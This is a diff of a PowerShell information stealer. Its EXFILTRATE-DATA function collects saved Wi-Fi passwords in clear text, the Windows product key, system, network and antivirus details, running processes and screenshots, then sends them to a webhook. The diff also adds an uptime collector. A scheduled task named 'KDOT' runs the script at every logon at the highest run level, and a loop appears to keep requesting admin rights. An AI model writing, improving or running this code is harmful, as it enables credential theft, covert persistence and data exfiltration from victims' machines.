@@ -1,9 +1,8 @@
 function CHECK_IF_ADMIN {
-    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-    return $test
+    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
 }
 
-function Invoke-Extraction {
+function EXFILTRATE-DATA {
     $webhook = "YOUR_WEBHOOK_HERE"
     $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
     $ip = $ip.Content
@@ -21,14 +20,21 @@ function Invoke-Extraction {
     $gpu = (Get-WmiObject Win32_VideoController).Name 
     $gpu > $env:LOCALAPPDATA\Temp\GPU.txt
     $format = " GB"
-    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
+    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
     $raminfo = "$total" + "$format"  
-    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
+    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
     $mac > $env:LOCALAPPDATA\Temp\mac.txt
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
-    netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
+    $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
 	
+	# System Uptime
+	function Get-Uptime {
+    $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
+    $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
+    $uptimedata
+    }
+    $uptime = Get-Uptime
 	
 	# List of Installed AVs
 	
@@ -37,25 +43,24 @@ function Invoke-Extraction {
     $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
     $AntivirusProduct.displayName 
     }
-    $avlist = get-installed-av -autosize | Format-Table | out-string
+    $avlist = get-installed-av -autosize | ft | out-string
     
-    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
+    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
     $wifi = $wifipasslist | out-string 
     $wifi > $env:temp\WIFIPasswords.txt
     
     Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
     
-    Get-WmiObject win32_service |Where-Object State -match "running" | Select-Object Name, DisplayName, PathName, User | Sort-Object Name | Format-Table -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
+    Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
     
-    Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | Format-Table -wrap -autosize > $env:temp\running-applications.txt
+    Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
     
     Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
     
-    Get-NetAdapter | Format-Table Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
+    Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
 
     
-    $ProductKey
-    Get-ProductKey > $env:localappdata\temp\ProductKey.txt
+   
 
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
@@ -107,7 +112,7 @@ function Invoke-Extraction {
                     },
                     @{
                         "name" = ":computer: Hardware"
-                        "value" = "``````OS: $osversion `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac``````"
+                        "value" = "``````OS: $osversion `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                     },
                     @{
                         "name" = ":floppy_disk: Disk"
@@ -193,8 +198,7 @@ function Invoke-TASKS {
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
-
-    Invoke-Extraction
+    EXFILTRATE-DATA
 }
 
 function diskdata {
@@ -205,28 +209,31 @@ function diskdata {
         $totalspace = [math]::round($disk.size / 1GB, 2)
         $freespace = [math]::round($disk.freespace / 1GB, 2)
         $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
-        $disk | Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} | Format-Table 
+        $disk | Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} | FT 
     }
 }
 
 function Get-ProductKey {
-    $map="BCDFGHJKMPQRTVWXY2346789"
-    $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
-    $ProductKey = ""
-    for ($i = 24; $i -ge 0; $i--) {
-        $r = 0
-        for ($j = 14; $j -ge 0; $j--) {
-            $r = ($r * 256) -bxor $value[$j]
-            $value[$j] = [math]::Floor([double]($r / 24))
-            $r = $r % 24
-        }
-        $ProductKey = $map[$r] + $ProductKey
-
-        if (($i % 5) -eq 0 -and $i -ne 0) {
-            $ProductKey = "-" + $ProductKey
-        }
+  $map="BCDFGHJKMPQRTVWXY2346789"
+  $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
+  $ProductKey = ""
+  for ($i = 24; $i -ge 0; $i--) {
+    $r = 0
+    for ($j = 14; $j -ge 0; $j--) {
+      $r = ($r * 256) -bxor $value[$j]
+      $value[$j] = [math]::Floor([double]($r / 24))
+      $r = $r % 24
     }
+    $ProductKey = $map[$r] + $ProductKey
+
+    if (($i % 5) -eq 0 -and $i -ne 0) {
+      $ProductKey = "-" + $ProductKey
+    }
+  }
+  $ProductKey
 }
+$ProductKey = Get-ProductKey
+Get-ProductKey > $env:localappdata\temp\ProductKey.txt
 
 function Request-Admin {
     while(!(CHECK_IF_ADMIN)) {
